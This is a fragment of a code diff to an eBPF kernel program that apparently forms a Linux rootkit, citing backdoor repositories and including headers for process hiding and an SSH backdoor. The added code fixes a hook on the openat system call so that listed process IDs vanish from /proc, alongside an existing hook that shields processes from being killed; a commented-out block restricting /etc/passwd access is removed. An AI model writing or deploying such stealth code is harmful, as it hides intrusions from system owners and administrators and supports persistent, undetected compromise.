@@ -10,7 +10,10 @@
 // https://github.com/pathtofile/bad-bpf/tree/main
 // https://github.com/Esonhugh/sshd_backdoor/tree/Skyworship
 // https://github.com/bfengj/eBPFeXPLOIT
+
+///
 extern int bpf_strstr(const char *s1__ign, const char *s2__ign) __ksym __weak;
+
 #include "event.h"
 #include "hide.h"
 #include "sshBackdoor.h"
@@ -97,28 +100,6 @@ int BPF_PROG(avoidKill, struct task_struct *p, struct kernel_siginfo *info,
 }
 
 // shit for hiding processes
-// SEC("lsm/file_open")
-// int BPF_PROG(file_open, struct file *file) {
-//  char path[256];
-//  pid_t pid = bpf_get_current_pid_tgid() >> 32;
-//
-//  // Get the absolute path
-//  bpf_d_path(&file->f_path, path, sizeof(path));
-//
-//  // Block access to specific files
-//  if (bpf_strstr(path, "secret.txt") == 0) {
-//    bpf_printk("PID %d: BLOCKED %s\n", pid, path);
-//    return -EACCES; // Permission denied
-//  }
-//
-//  // Block /etc/passwd
-//  if (bpf_strstr(path, "/etc/passwd") == 0) {
-//    bpf_printk("PID %d: BLOCKED /etc/passwd\n", pid);
-//    return -EPERM;
-//  }
-//
-//  return 0; // Allow
-//}
 
 SEC("fmod_ret/__x64_sys_openat")
 int BPF_PROG(modify_openat, const struct pt_regs *regs) {
@@ -128,24 +109,50 @@ int BPF_PROG(modify_openat, const struct pt_regs *regs) {
   if (pid == 4400) {
     return 0;
   }
+
   const char *user_filename;
   user_filename = (const char *)regs->si;
+
+  char filename[256];
+  int ret = bpf_probe_read_user_str(filename, sizeof(filename), user_filename);
+  if (ret < 0) {
+    return 0;
+  }
+
   __u32 i;
   pid_t *value;
   bpf_for(i, 0, MAX_PIDS_TO_HIDE) {
     value = (pid_t *)bpf_map_lookup_elem(&pidToHideMap, &i);
 
-    if (value == 0) {
+    if (value == 0 || *value == 0) {
       continue;
     }
 
     char pid_str[64];
-    BPF_SNPRINTF(pid_str, sizeof(pid_str), "/proc/%d", pid);
+    BPF_SNPRINTF(pid_str, sizeof(pid_str), "/proc/%d", *value);
 
-    if (bpf_strstr(pid_str, user_filename) == 0) {
-      bpf_printk("blocked\n");
+    // Use bpf_strncmp or check if filename starts with pid_str
+    int len = 0;
+#pragma unroll
+    for (int j = 0; j < 20 && pid_str[j] != '\0'; j++) {
+      len++;
+    }
 
-      return -EPERM;
+    // Check if filename starts with the pid path
+    bool match = true;
+#pragma unroll
+    for (int j = 0; j < 20; j++) {
+      if (j >= len)
+        break;
+      if (pid_str[j] != filename[j]) {
+        match = false;
+        break;
+      }
+    }
+
+    if (match) {
+      bpf_printk("blocked pid path: %s\n", pid_str);
+      return -ENOENT;
     }
   }
 
